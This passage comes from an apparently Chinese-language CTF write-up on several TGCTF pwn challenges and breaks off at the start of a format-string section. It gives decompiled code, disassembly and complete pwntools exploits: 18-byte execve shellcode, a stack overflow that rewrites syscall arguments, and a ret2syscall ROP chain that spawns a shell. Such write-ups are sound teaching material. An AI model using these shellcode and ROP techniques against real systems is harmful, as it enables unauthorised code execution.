class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/pwn/桌面/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>题目提示够用了仔细看寄存器</p><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello hacker&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;try to show your strength &quot;</span>);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">18uLL</span>);</span><br><span class="line">  mprotect(buf, <span class="number">0x1000</span>uLL, <span class="number">4</span>);</span><br><span class="line">  sub_11C9(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>buf位于栈上被改为可读可写可执行，后续buf作为参数被传入rdi中调用sub_11C9函数，汇编如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000011C9 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:00000000000011CD 55                            push    rbp</span><br><span class="line">.text:00000000000011CE 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000000011D1 41 57                         push    r15</span><br><span class="line">.text:00000000000011D3 41 56                         push    r14</span><br><span class="line">.text:00000000000011D5 41 55                         push    r13</span><br><span class="line">.text:00000000000011D7 41 54                         push    r12</span><br><span class="line">.text:00000000000011D9 53                            push    rbx</span><br><span class="line">.text:00000000000011DA 48 89 7D D0                   mov     [rbp+var_30], rdi</span><br><span class="line">.text:00000000000011DE 48 8B 7D D0                   mov     rdi, [rbp+var_30]</span><br><span class="line">.text:00000000000011E2 48 31 C0                      xor     rax, rax</span><br><span class="line">.text:00000000000011E5 48 31 DB                      xor     rbx, rbx</span><br><span class="line">.text:00000000000011E8 48 31 C9                      xor     rcx, rcx</span><br><span class="line">.text:00000000000011EB 48 31 D2                      xor     rdx, rdx</span><br><span class="line">.text:00000000000011EE 48 31 F6                      xor     rsi, rsi</span><br><span class="line">.text:00000000000011F1 4D 31 C0                      xor     r8, r8</span><br><span class="line">.text:00000000000011F4 4D 31 C9                      xor     r9, r9</span><br><span class="line">.text:00000000000011F7 4D 31 D2                      xor     r10, r10</span><br><span class="line">.text:00000000000011FA 4D 31 DB                      xor     r11, r11</span><br><span class="line">.text:00000000000011FD 4D 31 E4                      xor     r12, r12</span><br><span class="line">.text:0000000000001200 4D 31 ED                      xor     r13, r13</span><br><span class="line">.text:0000000000001203 4D 31 F6                      xor     r14, r14</span><br><span class="line">.text:0000000000001206 4D 31 FF                      xor     r15, r15</span><br><span class="line">.text:0000000000001209 48 31 ED                      xor     rbp, rbp</span><br><span class="line">.text:000000000000120C 48 31 E4                      xor     rsp, rsp</span><br><span class="line">.text:000000000000120F 48 89 FF                      mov     rdi, rdi</span><br><span class="line">.text:0000000000001212 FF E7                         jmp     rdi</span><br><span class="line">.text:0000000000001212</span><br><span class="line">.text:0000000000001212                               sub_11C9 endp</span><br></pre></td></tr></table></figure><p>会将除RDI RIP外的所有寄存器清零故在设置execve(‘&#x2F;bin&#x2F;sh,0,0’)时我们不用管rsi和rdx，只用看rdi和rax就好了，关键在于如何让rdi的值为&#x2F;bin&#x2F;sh的地址，<strong>注意只能是&#x2F;bin&#x2F;sh的地址</strong>，因为execve的各个参数都是指针，如果直接将&#x2F;bin&#x2F;sh这个具体字符赋值给rdi函数会无法解析，选择将&#x2F;bin&#x2F;sh写在buf上，然后通过rsp传递&#x2F;bin&#x2F;sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea rsp, [rdi + 11]   ;4字节将rdi指向的地址加上 11后的结果赋值给rsp(刚好指向/bin/sh)</span><br><span class="line">mov rdi,rsp           ;3字节将rsp的值赋给rdi  </span><br><span class="line">mov al,0x3b ;2字节将rax的值设置为0x3b</span><br><span class="line">syscall               ;2字节系统调用</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node2.tgctf.woooo.tech&#x27;</span>,<span class="number">30243</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">lea rsp, [rdi + 11]  </span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">mov al,0x3b</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = shellcode+ <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><blockquote><p><strong>新姿势：lea用于计算内存地址并将结果存储在目标寄存器中，相较于先add再mov更省字节</strong></p></blockquote><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>checksec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn            </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;welcome! could you tell me your name?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;unk_404060, <span class="number">0xA8uLL</span>);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;what dou you want to say?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_4011FA</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_4011FA()函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">sub_4011FA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">56</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+48h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">sys_read</span>(<span class="number">0</span>, buf, <span class="number">0x50uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> retaddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_4011FA()函数很明显存在栈溢出但是要构造rop链来泄露libc明显不太够main函数中还有个read可以读很多数据到data段</p><p>data段从unk_404060开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000404060 00                            unk_404060 db    0                      ; DATA XREF: main+62↑o</span><br><span class="line">.data:0000000000404061 00                            db    0</span><br><span class="line">.data:0000000000404062 00                            db    0</span><br><span class="line">.data:0000000000404063 00                            db    0</span><br><span class="line">.data:0000000000404064 00                            db    0</span><br><span class="line">.data:0000000000404065 00                            db    0</span><br><span class="line">.data:0000000000404066 00                            db    0</span><br><span class="line">.data:0000000000404067 00                            db    0</span><br><span class="line">.data:0000000000404068 00                            db    0</span><br><span class="line">.data:0000000000404069 00                            db    0</span><br><span class="line">.data:000000000040406A 00                            db    0</span><br><span class="line">.data:000000000040406B 00                            db    0</span><br><span class="line">.data:000000000040406C 00                            db    0</span><br><span class="line">.data:000000000040406D 00                            db    0</span><br><span class="line">.data:000000000040406E 00                            db    0</span><br><span class="line">.data:000000000040406F 00                            db    0</span><br><span class="line">.data:0000000000404070 00                            db    0</span><br><span class="line">.data:0000000000404071 00                            db    0</span><br><span class="line">.data:0000000000404072 00                            db    0</span><br><span class="line">.data:0000000000404073 00                            db    0</span><br><span class="line">.data:0000000000404074 00                            db    0</span><br><span class="line">.data:0000000000404075 00                            db    0</span><br><span class="line">.data:0000000000404076 00                            db    0</span><br><span class="line">.data:0000000000404077 00                            db    0</span><br><span class="line">.data:0000000000404078 00                            db    0</span><br><span class="line">.data:0000000000404079 00                            db    0</span><br><span class="line">.data:000000000040407A 00                            db    0</span><br><span class="line">.data:000000000040407B 00                            db    0</span><br><span class="line">.data:000000000040407C 00                            db    0</span><br><span class="line">.data:000000000040407D 00                            db    0</span><br><span class="line">.data:000000000040407E 00                            db    0</span><br><span class="line">.data:000000000040407F 00                            db    0</span><br><span class="line">.data:0000000000404080 00                            db    0</span><br><span class="line">.data:0000000000404081 00                            db    0</span><br><span class="line">.data:0000000000404082 00                            db    0</span><br><span class="line">.data:0000000000404083 00                            db    0</span><br><span class="line">.data:0000000000404084 00                            db    0</span><br><span class="line">.data:0000000000404085 00                            db    0</span><br><span class="line">.data:0000000000404086 00                            db    0</span><br><span class="line">.data:0000000000404087 00                            db    0</span><br><span class="line">.data:0000000000404088 00                            db    0</span><br><span class="line">.data:0000000000404089 00                            db    0</span><br><span class="line">.data:000000000040408A 00                            db    0</span><br><span class="line">.data:000000000040408B 00                            db    0</span><br><span class="line">.data:000000000040408C 00                            db    0</span><br><span class="line">.data:000000000040408D 00                            db    0</span><br><span class="line">.data:000000000040408E 00                            db    0</span><br><span class="line">.data:000000000040408F 00                            db    0</span><br><span class="line">.data:0000000000404090 00                            db    0</span><br><span class="line">.data:0000000000404091 00                            db    0</span><br><span class="line">.data:0000000000404092 00                            db    0</span><br><span class="line">.data:0000000000404093 00                            db    0</span><br><span class="line">.data:0000000000404094 00                            db    0</span><br><span class="line">.data:0000000000404095 00                            db    0</span><br><span class="line">.data:0000000000404096 00                            db    0</span><br><span class="line">.data:0000000000404097 00                            db    0</span><br><span class="line">.data:0000000000404098 00                            db    0</span><br><span class="line">.data:0000000000404099 00                            db    0</span><br><span class="line">.data:000000000040409A 00                            db    0</span><br><span class="line">.data:000000000040409B 00                            db    0</span><br><span class="line">.data:000000000040409C 00                            db    0</span><br><span class="line">.data:000000000040409D 00                            db    0</span><br><span class="line">.data:000000000040409E 00                            db    0</span><br><span class="line">.data:000000000040409F 00                            db    0</span><br><span class="line">.data:00000000004040A0 01 00 00 00 00 00 00 00       qword_4040A0 dq 1                       ; DATA XREF: sub_4011FA-2A↑r</span><br><span class="line">.data:00000000004040A8                               ; unsigned int fd</span><br><span class="line">.data:00000000004040A8 01 00 00 00 00 00 00 00       fd dq 1                                 ; DATA XREF: sub_4011FA-23↑r</span><br><span class="line">.data:00000000004040B0 00                            db    0</span><br><span class="line">.data:00000000004040B1 00                            db    0</span><br><span class="line">.data:00000000004040B2 00                            db    0</span><br><span class="line">.data:00000000004040B3 00                            db    0</span><br><span class="line">.data:00000000004040B4 00                            db    0</span><br><span class="line">.data:00000000004040B5 00                            db    0</span><br><span class="line">.data:00000000004040B6 00                            db    0</span><br><span class="line">.data:00000000004040B7 00                            db    0</span><br><span class="line">.data:00000000004040B8                               ; size_t count</span><br><span class="line">.data:00000000004040B8 0B 00 00 00 00 00 00 00       count dq 0Bh                            ; DATA XREF: sub_4011FA-19↑r</span><br><span class="line">.data:00000000004040C0                               ; char buf[72]</span><br><span class="line">.data:00000000004040C0 00 00 00 00 00 00 00 00 00 00+buf db 48h dup(0)                       ; DATA XREF: sub_4011FA-3C↑o</span><br><span class="line">.data:00000000004040C0 00 00 00 00 00 00 00 00 00 00+                                        ; sub_4011FA-31↑o</span><br><span class="line">.data:0000000000404108 2F 62 69 6E 2F 73 68 00       aBinSh db &#x27;/bin/sh&#x27;,0</span><br></pre></td></tr></table></figure><p>发现了&#x2F;bin&#x2F;sh地址，先记录后续应该用的上，溢出字节数够我们可以覆盖很多内容：qword_4040A0 dq 1；fd dq 1 ；count dq 0Bh 这三个参数很可疑汇编里找找它在哪</p><p>sub_4011FA</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/TG1.png" alt="1"></p><p>发现当[rbp+8]处的内容和[rbp+0x28]处的内容不一样时会跳转到<code>loc_4011B6</code>这个函数</p><p>找到这个函数就在sub_4011FA汇编的上面，但是没有对应的函数名称所以在左侧函数名称栏看不到</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/TG2.png" alt="1"></p><p>发现了刚刚我们可以覆盖的那几个参数，分别对应rax ，rdi，rdx，其中通过gdb调试发现rsi的地址是指向0的指针，所以我们可以通过第一个read来覆盖特定参数达到execve(‘&#x2F;bin&#x2F;sh,0,0’)</p><p>当[rbp+8]处的内容和[rbp+0x28]处的内容不一样时才会跳转到<code>loc_4011B6</code>这个函数，在未栈溢出覆盖时这两个地方的值是一样的所以我们要覆盖掉rbp+8处的内容使函数能正常跳转</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span>,<span class="number">30764</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bin_sh=<span class="number">0x404108</span></span><br><span class="line"></span><br><span class="line">qword_4040A0_offset = <span class="number">0x40</span>  <span class="comment"># 64 字节</span></span><br><span class="line">fd_offset = <span class="number">0x48</span>            <span class="comment"># 72 字节</span></span><br><span class="line">count_offset = <span class="number">0x58</span></span><br><span class="line"><span class="comment"># 构造 payload</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * qword_4040A0_offset  <span class="comment"># 填充到 qword_4040A0 的偏移量</span></span><br><span class="line">payload += p64(<span class="number">0x3b</span>)                  <span class="comment"># 写入 0x3b</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * (fd_offset - qword_4040A0_offset - <span class="number">8</span>)  <span class="comment"># 填充到 fd 的偏移量</span></span><br><span class="line">payload += p64(<span class="number">0x404108</span>)              <span class="comment"># 写入 0x404108</span></span><br><span class="line">payload += <span class="string">b&#x27;C&#x27;</span> * (count_offset - fd_offset - <span class="number">8</span>)         <span class="comment"># 填充到 count 的偏移量</span></span><br><span class="line">payload += p64(<span class="number">0x0000000000000000</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>)+<span class="string">b&#x27;12345678&#x27;</span>*<span class="number">2</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;want to say?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>checksec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>check版本老了，实际上没开canary因为静态编译所以误检测了，程序是静态编译的，两段输入第一段通过read读到bss段上可以读0x100个字节，第二段gets读入栈上可以栈溢出控制执行流</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">200</span>]; <span class="comment">// [esp+0h] [ebp-D0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+C8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>[<span class="number">0</span>], <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;could you tell me your name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;i heard you love gets,right?&quot;</span>);</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目前思路在name处写下rop链进行ret2syscall系统调用execve(‘&#x2F;bin&#x2F;sh’,0,0)，gets处构造溢出控制执行流即可</p><p>因为是全静态编译，gets函数也是静态构造的没有link，所以通过gdb调试进入到gets函数来找偏移</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/TG4.png" alt="1"></p><p>前面还有一个  _uflow 函数调用获取一个字符所以我们的输入起始地址是0xfffd048继续调式</p><p>可以看到运行到gets函数结束时旧的ebp在0xffffd118处距离输入即为0xD0这个数据和IDA上的相同但是想要控制执行流并不能将返回地址覆盖在0xD0+4+4处因为main函数汇编ret这里有点不一样</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/TG3.png" alt="1"></p><p>我们先找esp因为最后retn是pop eip将esp指向的地址弹给执行流，来到080498C0处也就是<code>lea esp,[ebp - 8]</code>ebp是我们可控的，esp现在的地址是[ebp - 8]处紧接着<code>pop ecx</code>将该处前4个字节弹给ecx后面还要弹两个但是用处不大，就到了0x080498C6处<code>lea esp,[ecx - 4]</code>此时esp的值被改为了[ecx - 4]也就是[ebp - 8 -4]处所以我们要将返回地址放到[ebp-8]处才能跳转且返回地址的值要加4才是正确的返回地址</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span>,<span class="number">31579</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=<span class="number">0x080EF320</span></span><br><span class="line"></span><br><span class="line">int_80=<span class="number">0x08073D70</span></span><br><span class="line">pop_eax=<span class="number">0x080b470a</span></span><br><span class="line">pop_ebx=<span class="number">0x08049022</span></span><br><span class="line">pop_ecx=<span class="number">0x08049802</span></span><br><span class="line">pop_edx=<span class="number">0x08060bd1</span></span><br><span class="line">bin_sh=name</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p32(pop_eax)+p32(<span class="number">0xb</span>)+p32(pop_ebx)+p32(bin_sh)+p32(pop_ecx)+p32(<span class="number">0</span>)+p32(pop_edx)+p32(<span class="number">0</span>)+p32(int_80)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xD0</span>-<span class="number">0x8</span>)+p32(name+<span class="number">0x4</span>+<span class="number">0x8</span>) </span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;right?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p> p32(name+0x4+0x8)加4上面已经讲了，加8是为了跳过<code>/bin/sh\x00</code>‘占8字节 </p><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>利用格式化字符漏洞任意写</p><p>checksec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary 